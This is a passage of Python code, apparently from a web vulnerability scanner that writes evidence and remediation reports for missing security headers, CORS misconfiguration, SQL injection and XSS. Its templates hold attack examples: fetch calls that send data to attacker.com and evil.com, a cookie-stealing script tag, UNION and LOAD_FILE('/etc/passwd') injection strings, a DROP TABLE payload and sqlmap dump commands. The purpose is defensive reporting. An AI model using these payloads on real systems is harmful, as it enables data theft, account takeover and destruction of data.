    },
    "Referrer-Policy": {
        "abbrev": "RP",
        "rfc": "W3C Referrer Policy spec",
        "owasp": "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html",
        "recommended": "strict-origin-when-cross-origin",
        "attack": "Sensitive URL leakage via Referer header to third parties",
        "attack_detail": (
            "Without a restrictive Referrer-Policy, when a user clicks a link from your "
            "site to a third-party (ad network, analytics, CDN), their browser sends the "
            "full URL of the page they were on — including any query parameters. These "
            "may contain session tokens, user IDs, or other sensitive data."
        ),
        "nginx_fix": 'add_header Referrer-Policy "strict-origin-when-cross-origin" always;',
        "apache_fix": 'Header always set Referrer-Policy "strict-origin-when-cross-origin"',
        "express_fix": "app.use(helmet.referrerPolicy({ policy: 'strict-origin-when-cross-origin' }));",
    },
    "Permissions-Policy": {
        "abbrev": "PP",
        "rfc": "W3C Permissions Policy spec",
        "owasp": "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html",
        "recommended": "camera=(), microphone=(), geolocation=(), payment=()",
        "attack": "Unauthorised browser feature access (camera, mic, location)",
        "attack_detail": (
            "Without Permissions-Policy, any script on your page — including injected "
            "malicious scripts or compromised third-party libraries — can request access "
            "to the user's camera, microphone, or geolocation without your knowledge."
        ),
        "nginx_fix": 'add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;',
        "apache_fix": 'Header always set Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()"',
        "express_fix": 'app.use(helmet.permittedCrossDomainPolicies());',
    },
    "X-XSS-Protection": {
        "abbrev": "XSP",
        "rfc": "Non-standard — Microsoft IE extension",
        "owasp": "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html",
        "recommended": "1; mode=block",
        "attack": "Reflected XSS in older browsers (IE, pre-CSP Chrome)",
        "attack_detail": (
            "This header enables the built-in XSS filter in Internet Explorer and early "
            "Chrome versions. While modern browsers use CSP instead, this header provides "
            "an additional layer of protection for users on legacy browsers or corporate "
            "environments locked to older browser versions."
        ),
        "nginx_fix": 'add_header X-XSS-Protection "1; mode=block" always;',
        "apache_fix": 'Header always set X-XSS-Protection "1; mode=block"',
        "express_fix": "app.use(helmet.xssFilter());",
    },
}


def security_header_missing(url: str, header_name: str,
                             response: requests.Response,
                             headers_info: dict) -> EvidenceRecord:
    meta = _HEADER_META.get(header_name, {
        "abbrev": header_name, "rfc": "N/A",
        "recommended": "See OWASP Secure Headers Project",
        "attack": "Browser security bypass",
        "attack_detail": "Specific attack depends on context.",
        "nginx_fix": f'add_header {header_name} "value" always;',
        "apache_fix": f'Header always set {header_name} "value"',
        "express_fix": f'// Install and configure appropriate helmet module',
        "owasp": "https://owasp.org/www-project-secure-headers/",
    })

    present_names = [p.get('name','') for p in headers_info.get('present', [])]
    missing_names = [m.get('name','') for m in headers_info.get('missing', [])]
    all_resp = "\n".join(f"  {k}: {v}" for k, v in response.headers.items())

    raw = f"""{_h1(f"RAW EVIDENCE — Missing Security Header: {header_name}")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}
{_kv("Test Method", "GET request + response header inspection")}
{_kv("Header Checked", header_name)}
{_kv("Abbreviation", meta.get('abbrev',''))}
{_kv("Governing Standard", meta.get('rfc',''))}
{_kv("OWASP Reference", meta.get('owasp',''))}

{_h2("HTTP REQUEST SENT")}
{_kv("Method", "GET")}
{_kv("URL", url)}
{_kv("User-Agent", response.request.headers.get('User-Agent','') if response.request else 'scanner')}

{_h2("HTTP RESPONSE RECEIVED")}
{_kv("Status", f"{response.status_code} {response.reason}")}
{_kv("Content-Type", response.headers.get('Content-Type','(not set)'))}
  All response headers:
{all_resp}

{_h2("HEADER AUDIT RESULT")}
{_kv("Checked For", header_name)}
{_kv("Present In Response", "NO")}
{_kv("Recommended Value", f"{header_name}: {meta.get('recommended','')}")}
{_kv("Headers Present", ', '.join(present_names[:8]) or 'None')}
{_kv("Other Missing Headers", ', '.join(missing_names[:8]) or 'None')}
{_kv("Header Score", f"{headers_info.get('percentage',0)}% ({headers_info.get('score',0)}/{headers_info.get('max_score',1)} points)")}

{_h2("ATTACK SCENARIO")}
{_kv("Attack Type", meta.get('attack',''))}
  Detailed attack path:
{_wrap(meta.get('attack_detail',''), width=72, indent=4)}

{_h2("FIX — ADD THIS HEADER")}
{_code(f"""# Nginx (add to server {{ }} block or http {{ }} block):
{meta.get('nginx_fix','')}

# Apache (.htaccess or VirtualHost block):
{meta.get('apache_fix','')}

# Node.js / Express:
{meta.get('express_fix','')}

# Verify after applying:
curl -sI {url} | grep -i '{header_name.split("-")[0].lower()}'""")}
"""

    plain = f"""
WHAT THIS MEANS — Missing {header_name} ({meta.get('abbrev','')})
{'─' * (26 + len(header_name) + len(meta.get('abbrev','')))}
Your server is not sending the "{header_name}" header.

WHAT THIS HEADER DOES:
  {meta.get('attack_detail','')}

ATTACK IT PREVENTS:
  {meta.get('attack','')}

WHAT AN ATTACKER CAN DO WITHOUT IT:
{_wrap(meta.get('attack_detail',''), width=76, indent=2)}

HOW TO FIX IT (one line of config):
  The fix is adding a single line to your web server configuration file.
  It takes effect immediately after a config reload — no downtime, no code
  changes required.

  Nginx:  {meta.get('nginx_fix','')}
  Apache: {meta.get('apache_fix','')}

  If you use a cloud provider (Cloudflare, AWS CloudFront, Fastly), you can
  add this header via their dashboard without touching your server.

  Recommended value:
  {header_name}: {meta.get('recommended','')}

PRIORITY:
  Apply this header across all pages and subdomains at the web server level
  so every response is automatically covered.
"""
    return EvidenceRecord(raw, plain)


# ═══════════════════════════════════════════════════════════════════════════════
# CORS EVIDENCE
# ═══════════════════════════════════════════════════════════════════════════════

def cors_wildcard(url: str, response: requests.Response,
                  evil_origin: str, acao: str, acac: str,
                  preflight_detail: str) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — CORS Wildcard Origin (Access-Control-Allow-Origin: *)")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}
{_kv("Test Method", "GET with injected Origin header + OPTIONS preflight")}

{_h2("HTTP REQUEST SENT")}
{_kv("Method", "GET")}
{_kv("URL", url)}
{_kv("Origin Header Sent (injected)", evil_origin)}
{_kv("Purpose", "Simulate a request from an attacker-controlled domain")}

{_h2("HTTP RESPONSE RECEIVED")}
{_kv("Status", f"{response.status_code} {response.reason}")}
{_kv("Content-Type", response.headers.get('Content-Type','(not set)'))}
{_kv("Access-Control-Allow-Origin", acao + "  ← FINDING")}
{_kv("Access-Control-Allow-Credentials", acac or "(not set)")}
{_kv("Access-Control-Allow-Methods", response.headers.get('Access-Control-Allow-Methods','(not set)'))}
{_kv("Access-Control-Allow-Headers", response.headers.get('Access-Control-Allow-Headers','(not set)'))}
  All response headers:
{_fmt_resp_headers(response)}

{_h2("PREFLIGHT (OPTIONS) REQUEST RESULT")}
{preflight_detail}

{_h2("EXPLOITATION ANALYSIS")}
{_kv("Wildcard Grants Access To", "ANY origin — every website on the internet")}
{_kv("Credentials Included", "NO — wildcard + credentials is blocked by spec")}
{_kv("Unauthenticated Data Accessible", "YES — any website can read unauthenticated responses")}
{_kv("Impact on Public APIs", "Any website can proxy your API responses")}

{_h2("PROOF-OF-CONCEPT (PoC) — attacker's page")}
{_code("""<!-- This code on any website can read your server's response -->
<script>
fetch("%(url)s", { method: "GET" })
  .then(r => r.text())
  .then(data => {
    // 'data' now contains your server's response — attacker reads it
    fetch("https://attacker.com/collect", {
      method: "POST",
      body: data
    });
  });
</script>""" % {"url": url})}

{_h2("FIX")}
{_code("""# Replace * with your actual frontend domain(s):

# Nginx:
add_header Access-Control-Allow-Origin "https://yourfrontend.com" always;

# Express / Node.js:
const cors = require('cors');
app.use(cors({
  origin: ['https://yourfrontend.com'],  // whitelist only
  credentials: true
}));

# Dynamic whitelist (if multiple origins needed):
const ALLOWED_ORIGINS = ['https://app.yoursite.com', 'https://www.yoursite.com'];
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  next();
});""")}
"""

    plain = f"""
WHAT THIS MEANS — Any Website Can Access Your Server's Data
────────────────────────────────────────────────────────────
We pretended to be a website called "{evil_origin}" and asked your server
for data. Your server responded with:
  Access-Control-Allow-Origin: *

The "*" means "I will share my responses with ANYONE." Every website on
the internet is permitted to make requests to your server and read the
responses.

REAL-WORLD RISK:
  If a user is browsing any other website on the internet while logged into
  yours, that other website's JavaScript can silently fetch data from your
  server. If your API has any unauthenticated endpoints that return user data,
  that data can be read.

  Example: Your /api/user-summary endpoint returns aggregated data. An
  attacker's website makes a JavaScript fetch() call to that endpoint. Your
  server sends the data back (because *, anyone is allowed), and the attacker
  collects it.

WHY THIS HAPPENS:
  Developers often set CORS to "*" during development/testing and forget to
  restrict it before going to production. It's a common, easy-to-miss mistake.

HOW TO FIX IT:
  Replace the wildcard with your specific trusted frontend domain(s):
  
    Change: Access-Control-Allow-Origin: *
    To:     Access-Control-Allow-Origin: https://yourapp.com

  If you have multiple front-end domains, use a server-side check that
  compares the incoming Origin header to an approved list and reflects
  only approved origins (not all origins).
"""
    return EvidenceRecord(raw, plain)


def cors_reflection_with_credentials(url: str, response: requests.Response,
                                      evil_origin: str, acao: str,
                                      acac: str, preflight_detail: str) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — CRITICAL: CORS Origin Reflection + Credentials")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}
{_kv("Severity", "CRITICAL — authenticated cross-origin access possible")}

{_h2("HTTP REQUEST SENT")}
{_kv("Method", "GET")}
{_kv("URL", url)}
{_kv("Origin Header Injected", evil_origin)}

{_h2("HTTP RESPONSE — CRITICAL HEADERS")}
{_kv("Access-Control-Allow-Origin", acao + "  ← reflected untrusted origin")}
{_kv("Access-Control-Allow-Credentials", acac + "  ← CRITICAL: credentials allowed")}
{_kv("Combined Impact", "Server trusts any origin AND allows cookies — full auth bypass")}
  All response headers:
{_fmt_resp_headers(response)}

{_h2("PREFLIGHT ANALYSIS")}
{preflight_detail}

{_h2("EXPLOITATION — STEP BY STEP")}
  Step 1: Victim logs into your application — session cookie is set.
  Step 2: Victim visits attacker's site (evil.com) while still logged in.
  Step 3: evil.com runs this JavaScript:
{_code("""fetch("%(url)s", {
  method: "GET",
  credentials: "include"   // ← sends the victim's session cookie!
})
.then(r => r.json())
.then(data => {
  // data contains the victim's PRIVATE data from your authenticated endpoint
  fetch("https://evil.com/exfil", { method:"POST", body: JSON.stringify(data) });
});""" % {"url": url})}
  Step 4: Your server receives the request with the victim's cookie.
          Because Access-Control-Allow-Origin reflects evil.com AND
          Access-Control-Allow-Credentials: true, the browser sends it.
  Step 5: Your server returns private data as if the victim requested it.
  Step 6: evil.com reads the response — victim's account is compromised.

{_h2("CVSS v3.1")}
{_kv("Vector", "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N")}
{_kv("Score", "9.3 — Critical")}

{_h2("FIX")}
{_code("""// NEVER blindly reflect the Origin header.
// Maintain a strict allowlist:

const ALLOWED_ORIGINS = new Set([
  'https://app.yoursite.com',
  'https://www.yoursite.com',
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
  }
  // Never set these headers for unlisted origins
  next();
});""")}
"""

    plain = f"""
WHAT THIS MEANS — CRITICAL: Attackers Can Hijack Your Users' Accounts
──────────────────────────────────────────────────────────────────────
This is the most serious type of CORS misconfiguration. Here is exactly
what can happen to one of your users:

  1. Alice logs into your website. Your server gives her a session cookie.
  2. While still logged in, Alice visits evil-attacker.com (perhaps through
     a phishing link, a malicious ad, or a compromised website she trusts).
  3. evil-attacker.com runs invisible JavaScript that calls your API at:
     {url}
  4. The browser automatically includes Alice's session cookie with the
     request — because your server says "evil-attacker.com is allowed and
     credentials are permitted."
  5. Your server returns Alice's private data, thinking it's Alice.
  6. evil-attacker.com reads everything — account details, messages, orders,
     or anything your API returns for authenticated users.

THE ROOT CAUSE:
  Your server is echoing back whatever "Origin" header it receives, instead
  of checking it against a list of trusted domains. Combined with
  "Access-Control-Allow-Credentials: true", this creates a complete
  authentication bypass for any cross-site request.

  We sent Origin: {evil_origin}
  Your server responded: Access-Control-Allow-Origin: {acao}
  Your server also said: Access-Control-Allow-Credentials: {acac}

HOW TO FIX IT:
  Stop reflecting the Origin header. Instead, check it against a hardcoded
  list of your trusted domains, and only set the header if it matches.
  
  If you don't need cross-origin credentials (most APIs don't), remove
  Access-Control-Allow-Credentials: true entirely.
"""
    return EvidenceRecord(raw, plain)


def cors_reflection_no_credentials(url: str, response: requests.Response,
                                    evil_origin: str, acao: str,
                                    preflight_detail: str) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — CORS Origin Reflection (No Credentials)")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}

{_h2("HTTP REQUEST SENT")}
{_kv("Method", "GET")}
{_kv("URL", url)}
{_kv("Origin Header Injected", evil_origin)}

{_h2("HTTP RESPONSE — CORS HEADERS")}
{_kv("Access-Control-Allow-Origin", acao + "  ← reflected attacker origin")}
{_kv("Access-Control-Allow-Credentials", "(not set — no auth bypass)")}
  All response headers:
{_fmt_resp_headers(response)}

{_h2("PREFLIGHT ANALYSIS")}
{preflight_detail}

{_h2("IMPACT ANALYSIS")}
{_kv("Credentials Sent", "NO — browser will not send cookies for reflected origins without credentials flag")}
{_kv("Unauthenticated Access", "YES — any website can read unauthenticated API responses")}
{_kv("Authenticated Bypass", "NO — cookies not included, so private data not directly accessible")}
{_kv("Data Leakage Risk", "Moderate — public/unauthenticated endpoints readable cross-origin")}

{_h2("FIX")}
{_code("""// Use a strict origin allowlist — never reflect blindly
const ALLOWED = ['https://yourapp.com'];
const origin = req.headers.origin;
if (ALLOWED.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Vary', 'Origin');
}
// For truly public APIs, '*' is acceptable — but audit first""")}
"""

    plain = f"""
WHAT THIS MEANS — Any Website Can Read Your Unauthenticated API Data
─────────────────────────────────────────────────────────────────────
Your server reflects the Origin header — meaning it tells any website that
it is allowed to read your responses. We tested by sending:
  Origin: {evil_origin}
And received:
  Access-Control-Allow-Origin: {acao}

Because the Credentials flag is not set, session cookies are not sent, so
private authenticated data is not directly accessible. However:

  ▸ Any unauthenticated API endpoints are readable by any website.
  ▸ This can expose public user data, product information, configurations,
    or internal metadata that should not be cross-origin accessible.
  ▸ It may also enable CSRF-style attacks on non-credentialed endpoints.

HOW SERIOUS IS IT:
  Less severe than the credentials variant, but still a misconfiguration.
  If your unauthenticated API returns anything sensitive (user counts,
  internal paths, configuration data), it is now accessible to any website.

HOW TO FIX IT:
  Use an explicit allowlist of trusted origins rather than reflecting whatever
  Origin header arrives. If your API is truly public (like a weather API or
  public data feed), then Access-Control-Allow-Origin: * is actually the
  correct and intentional choice. If not, restrict it.
"""
    return EvidenceRecord(raw, plain)


# ═══════════════════════════════════════════════════════════════════════════════
# SQL INJECTION EVIDENCE
# ═══════════════════════════════════════════════════════════════════════════════

def sqli_error_based(url: str, param: str, payload: str,
                     matched_pattern: str, error_snippet: str,
                     response: requests.Response,
                     baseline_url: str, baseline_status: Optional[int],
                     db_type: str) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — SQL Injection (Error-Based)")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}
{_kv("Parameter", param)}
{_kv("Injection Payload", payload)}
{_kv("Database Type", db_type)}
{_kv("Detection Method", "Error pattern matching in response body")}

{_h2("HTTP REQUEST — BASELINE (safe value)")}
{_kv("Method", "GET")}
{_kv("URL", baseline_url)}
{_kv("Parameter Value", f"{param}=1  (safe — no payload)")}
{_kv("Baseline Status", str(baseline_status) if baseline_status else "not captured")}

{_h2("HTTP REQUEST — PAYLOAD (injected)")}
{_kv("Method", "GET")}
{_kv("URL", url)}
{_kv("Parameter Value", f"{param}={payload}")}
{_kv("Response Status", f"{response.status_code} {response.reason}")}
{_kv("Content-Type", response.headers.get('Content-Type',''))}
{_kv("Content-Length", f"{len(response.content):,} bytes")}
  All response headers:
{_fmt_resp_headers(response)}

{_h2("ERROR PATTERN MATCHING")}
{_kv("Pattern Matched", matched_pattern)}
{_kv("Database Inferred", db_type)}
{_kv("Error Present in Baseline", "NO — error only appears with injection payload")}
{_kv("Error Snippet from Body", "")}
  {error_snippet or "(see body below)"}

{_h2("RESPONSE BODY — PAYLOAD HIGHLIGHTED")}
{_highlight_payload(response.text, payload) if payload in response.text else _body_excerpt(response.text, 800)}

{_h2("EXPLOITATION PATH")}
{_bullet([
    "UNION-based data extraction: ' UNION SELECT username,password,3 FROM users--",
    "Enumerate tables:             ' UNION SELECT table_name,2,3 FROM information_schema.tables--",
    "Extract all data:             sqlmap -u '" + url + "' -p " + param + " --dump-all",
    "If FILE privilege exists:     ' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--",
    "If stacked queries:           '; DROP TABLE users; --   (destructive)",
])}

{_h2("CVSS v3.1")}
{_kv("Vector", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H")}
{_kv("Score", "9.8 — Critical")}

{_h2("AUTOMATED EXPLOITATION (PoC)")}
{_code(f"""# Extract database version and tables with sqlmap:
sqlmap -u "{url}" -p {param} --dbms={db_type.split('/')[0].strip().lower()} \\
  --dbs --tables --dump --batch

# Manual test:
curl -v "{url}" 2>&1 | grep -i 'sql\\|mysql\\|error\\|exception'
""")}

{_h2("FIX — PARAMETERISED QUERIES")}
{_code(f"""# Python (correct — parameterised):
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Python (VULNERABLE — what this app likely does):
cursor.execute("SELECT * FROM users WHERE id = " + user_id)

# Node.js (correct):
db.query("SELECT * FROM users WHERE id = ?", [userId]);

# PHP (correct — PDO):
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

# Also: set DB error display = OFF in production:
# PHP:    display_errors = Off in php.ini
# MySQL:  log_error_verbosity = 1 (errors only to log, not browser)
""")}
"""

    plain = f"""
WHAT THIS MEANS — An Attacker Can Read (and Delete) Your Entire Database
─────────────────────────────────────────────────────────────────────────
We found SQL injection in the "{param}" parameter. This is one of the most
serious vulnerabilities a web application can have.

WHAT WE DID:
  We sent a deliberately broken SQL character — a single quote (') — to the
  "{param}" parameter. Your server responded with a database error message
  that proves it is passing our input directly into a database query.

  The error we found: {error_snippet[:200] if error_snippet else "(see technical section)"}

WHAT AN ATTACKER CAN DO:
  With this vulnerability and freely available tools (sqlmap), an attacker
  can extract your ENTIRE database in minutes — everything in it:

  ▸ All usernames and email addresses
  ▸ All password hashes (attackable offline with GPUs)
  ▸ All private messages, orders, and personal data
  ▸ API keys, session tokens, or encryption keys stored in the DB
  ▸ In some cases: read/write server files, execute OS commands

  Database type identified: {db_type}

HOW TO FIX IT:
  The fix is called "parameterised queries" (also called "prepared statements").
  Instead of building the SQL query as a string with user input included,
  you pass the user input separately as a parameter, and the database handles
  the separation. This completely prevents SQL injection.

  This is a code change — every place in your application that builds a
  database query by concatenating user input must be rewritten to use
  parameterised queries. Your development team will know what this means.
  The fix is well-established and typically takes a few hours to a few days
  depending on the size of the codebase.

  DO NOT attempt to fix this by filtering quotes or escaping input — these
  approaches are regularly bypassed. Parameterised queries are the only
  correct fix.
"""
    return EvidenceRecord(raw, plain)


def sqli_time_based(url: str, param: str, payload: str, db_type: str,
                     delay: float, baseline_delay: float,
                     baseline_url: str) -> EvidenceRecord:
    delta = delay - baseline_delay
    raw = f"""{_h1(f"RAW EVIDENCE — SQL Injection (Time-Based Blind — {db_type})")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}
{_kv("Parameter", param)}
{_kv("Database Type Indicated", db_type)}
{_kv("Detection Method", "Response time comparison (baseline vs sleep payload)")}

{_h2("TEST DESIGN — TWO REQUESTS COMPARED")}
  ┌─────────────────────────────────────────────────────────┐
  │  Request A — Baseline (safe value)                      │
  │  {param} = 1  (normal integer)                              │
  │  URL: {baseline_url[:60]}  │
  ├─────────────────────────────────────────────────────────┤
  │  Request B — Payload (sleep injection)                  │
  │  {param} = {payload[:40]}     │
  │  URL: {url[:60]}  │
  └─────────────────────────────────────────────────────────┘

{_h2("TIMING MEASUREMENTS")}
{_kv("Baseline Response Time", f"{baseline_delay:.3f}s  (normal server speed)")}
{_kv("Payload Response Time", f"{delay:.3f}s  (server held response for sleep duration)")}
{_kv("Observed Delta", f"{delta:.3f}s above baseline")}
{_kv("Detection Threshold", "3.5s above baseline")}
{_kv("Sleep Function in Payload", {
    "MySQL":          "SLEEP(4)",
    "MySQL-benchmark":"BENCHMARK(5000000,MD5(1))",
    "MSSQL":          "WAITFOR DELAY '0:0:4'",
    "PostgreSQL":     "pg_sleep(4)",
}.get(db_type.split()[0], "SLEEP(4)"))}
{_kv("Verdict", f"THRESHOLD EXCEEDED — sleep executed in DB (delta={delta:.2f}s)")}

{_h2("WHY THIS PROVES INJECTION")}
  Normal requests never take {delay:.1f}s to respond.
  The ONLY reason the server waited {delay:.1f}s is because the database
  executed our SLEEP function. The database ran our injected command.

  This is called "blind" injection because no error message is shown —
  the database executes our code silently, and we observe the effect
  through timing alone.

{_h2("BLIND EXTRACTION TECHNIQUE (DATA EXFIL WITHOUT ERRORS)")}
{_code(f"""# Sqlmap automates blind extraction:
sqlmap -u "{url}" -p {param} --technique=T --dbms={db_type.split('/')[0].strip().lower()} \\
  --dbs --tables --dump --batch

# Manual bit-by-bit extraction concept:
# Is first char of DB name 'a'? (A=65):
# {param}=' AND IF(ASCII(SUBSTR(database(),1,1))=65, SLEEP(4), 0)--
# If response takes 4s → first char is 'a'
# Automate with a script to enumerate each character
""")}

{_h2("CVSS v3.1")}
{_kv("Vector", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H")}
{_kv("Score", "9.8 — Critical")}
"""

    plain = f"""
WHAT THIS MEANS — Blind SQL Injection (No Error Visible, Still Exploitable)
────────────────────────────────────────────────────────────────────────────
This is SQL injection where the database error is hidden from the browser —
but the vulnerability is just as serious as if it were visible.

HOW WE PROVED IT:
  We sent two requests to the same URL:
  ▸ Request 1 (safe): {param}=1         → Server responded in {baseline_delay:.2f}s  (normal)
  ▸ Request 2 (sleep): {param}={payload[:30]}  → Server responded in {delay:.2f}s  (delayed!)
  
  The only explanation for the {delta:.1f}s delay is that the database ran our
  SLEEP command. Our injected code executed inside the database.

WHY "BLIND" IS STILL CRITICAL:
  Attackers don't need error messages. They ask the database yes/no questions
  through timing:
  
  "Is the first character of the admin password 'a'?"
  If the server pauses → Yes. If it responds quickly → No.
  
  Repeat for every character of every piece of data. Automated tools (sqlmap)
  can extract your entire database this way — it just takes a bit longer than
  error-based injection.

THE IMPACT IS IDENTICAL TO VISIBLE SQL INJECTION:
  ▸ All usernames, passwords, emails, orders — extractable
  ▸ The attacker is patient; the tool runs automatically overnight
  ▸ Database type identified: {db_type}

HOW TO FIX IT:
  Same fix as any SQL injection — use parameterised queries / prepared
  statements everywhere user input is used in a database query. There is no
  other reliable fix. See your development team and share this report.
"""
    return EvidenceRecord(raw, plain)


# ═══════════════════════════════════════════════════════════════════════════════
# XSS EVIDENCE
# ═══════════════════════════════════════════════════════════════════════════════

def xss_reflected(url: str, payload: str, response: requests.Response,
                   context_type: str, context_location: str,
                   context_detail: str, csp: str,
                   mitigated: bool) -> EvidenceRecord:
    raw = f"""{_h1(f"RAW EVIDENCE — Reflected XSS ({context_type}){' — CSP present' if mitigated else ''}")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}
{_kv("Test Parameter", "xss_test (synthetic)")}
{_kv("Payload Injected", payload)}
{_kv("Injection Context", context_type)}
{_kv("Location in Response", context_location)}

{_h2("HTTP REQUEST SENT")}
{_kv("Method", "GET")}
{_kv("URL", url)}
  Headers:
{_fmt_req_headers(dict(response.request.headers) if response.request else {})}

{_h2("HTTP RESPONSE")}
{_kv("Status", f"{response.status_code} {response.reason}")}
{_kv("Content-Type", response.headers.get('Content-Type',''))}
{_kv("Content-Length", f"{len(response.content):,} bytes")}
{_kv("CSP Header Present", f"YES — {csp[:100]}" if csp else "NO — script will execute without restriction")}
{_kv("X-XSS-Protection", response.headers.get('X-XSS-Protection','(not set)'))}
  All response headers:
{_fmt_resp_headers(response)}

{_h2("PAYLOAD REFLECTION ANALYSIS")}
{_kv("Payload Found in Response", "YES — verbatim, unencoded")}
{_kv("HTML Encoding Applied", "NO — raw < > chars not encoded to &lt; &gt;")}
{_kv("Context Type", context_type)}
{_kv("Context Detail", context_detail)}
  Payload in response body:
{_highlight_payload(response.text, payload)}

{_h2("INJECTION CONTEXT — SURROUNDING HTML")}
{_body_excerpt(response.text, 600)}

{_h2("CSP EVALUATION")}
{_kv("CSP Present", "YES" if csp else "NO")}
{_kv("CSP Value", csp[:200] if csp else "(none)")}
{_kv("unsafe-inline in CSP", "'unsafe-inline' present — CSP does not block inline scripts" if csp and 'unsafe-inline' in csp else "Not present" if csp else "N/A")}
{_kv("Browser Will Execute Payload", "NO (CSP may block)" if mitigated else "YES — no restriction")}

{_h2("ATTACK URL (to share with victim)")}
{_code(url)}
  Victim visits this URL → payload executes in their browser.

{_h2("COOKIE THEFT PoC (escalation)")}
{_code(f"""# Replace payload with cookie stealer:
<script>new Image().src='https://attacker.com/c?'+document.cookie</script>
# URL-encode and inject into the parameter to steal victim's session
""")}

{_h2("CVSS v3.1")}
{_kv("Vector", "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N")}
{_kv("Score", "6.1 (Medium) with CSP  /  8.8 (High) without CSP")}

{_h2("FIX")}
{_code("""# 1. HTML-encode all user input before rendering in HTML:
#    Python (Jinja2):  {{ user_input | e }}
#    PHP:              htmlspecialchars($input, ENT_QUOTES, 'UTF-8')
#    Node (Handlebars): {{user_input}}  (double braces = auto-escaped)

# 2. Add Content-Security-Policy header:
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

# 3. Use a security library (Python: bleach, JS: DOMPurify) for rich HTML input.
""")}
"""

    plain = f"""
WHAT THIS MEANS — Attackers Can Run Code in Your Users' Browsers
─────────────────────────────────────────────────────────────────
We found Reflected XSS (Cross-Site Scripting). Your server is echoing back
user-supplied input without sanitising it, and that input gets executed as
code in the user's browser.

HOW THE ATTACK WORKS:
  1. An attacker crafts a malicious link to your site with a script tag
     embedded in the URL parameters.
  2. They send this link to a victim (email, social media, phishing page).
  3. The victim clicks the link and loads your site.
  4. Your server reflects the attacker's payload back in the HTML.
  5. The victim's browser sees it as part of your page and executes it.
  6. The script runs — in the victim's browser, with access to everything
     on your site that the victim has access to.

WE SENT:  {payload}
YOUR SERVER RETURNED IT VERBATIM IN THE HTML PAGE.

WHAT THE ATTACKER'S SCRIPT CAN DO:
  ▸ Steal the user's session cookie → log in as them from anywhere
  ▸ Log every keystroke (keylogger) → capture passwords, card numbers
  ▸ Redirect them to a phishing page → credential harvest
  ▸ Make API calls as the user → change settings, delete data
  ▸ Display fake content / fake login forms on your site

{"CSP NOTE: A Content-Security-Policy header is present, which may reduce the impact by blocking some script execution. However, the underlying vulnerability still exists and should be fixed." if mitigated else "SEVERITY NOTE: There is no Content-Security-Policy header, so the payload will execute completely without restriction."}

HOW TO FIX IT:
  1. HTML-encode all user input before putting it into HTML output.
     This converts < to &lt; and > to &gt; so the browser treats it
     as text, not code. Every web framework has a built-in function for this.
  
  2. Add a Content-Security-Policy header to limit what scripts can run.
  
  These two fixes together make XSS extremely difficult to exploit.
"""
    return EvidenceRecord(raw, plain)


def xss_dom_sinks(url: str, response: requests.Response,
                   found_sinks: List[Tuple[str, str, str]]) -> EvidenceRecord:
    sink_names = [s for s, _, _ in found_sinks]
    raw = f"""{_h1("RAW EVIDENCE — DOM XSS Sink Detection")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}
{_kv("Test Method", "Static analysis of page JavaScript source")}
{_kv("Total Sinks Found", str(len(found_sinks)))}

{_h2("HTTP REQUEST")}
{_kv("Method", "GET")}
{_kv("URL", url)}
{_kv("Response Status", f"{response.status_code} {response.reason}")}
{_kv("Page Title", _title(response.text))}

{_h2("DANGEROUS SINKS FOUND — WITH SOURCE CONTEXT")}
"""
    for i, (sink, desc, snippet) in enumerate(found_sinks, 1):
        raw += f"""
  [{i}] Sink: {sink}
       Risk: {desc}
       Source context:
{_code('...' + snippet + '...')}
"""
    raw += f"""
{_h2("SINK CLASSIFICATION")}
{_kv("document.write / writeln", "Writes raw HTML — attacker can inject scripts" if any("document.write" in s for s,_,_ in found_sinks) else "Not found")}
{_kv("innerHTML / outerHTML", "Assigns HTML directly — classic XSS injection point" if any("innerHTML" in s or "outerHTML" in s for s,_,_ in found_sinks) else "Not found")}
{_kv("eval()", "Executes string as JS code — highly dangerous with user data" if any("eval(" in s for s,_,_ in found_sinks) else "Not found")}
{_kv("setTimeout/Interval", "String arguments executed as code" if any("setTimeout" in s or "setInterval" in s for s,_,_ in found_sinks) else "Not found")}
{_kv("location.href", "Can redirect to javascript: URLs" if any("location.href" in s for s,_,_ in found_sinks) else "Not found")}

